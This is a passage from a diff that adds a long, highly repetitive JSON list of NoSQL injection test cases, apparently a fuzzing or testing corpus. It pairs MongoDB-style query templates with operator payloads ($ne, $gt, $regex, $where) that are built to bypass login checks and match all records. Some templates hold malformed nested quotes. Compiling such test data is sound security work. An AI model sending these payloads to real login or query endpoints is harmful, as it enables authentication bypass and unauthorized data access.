+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
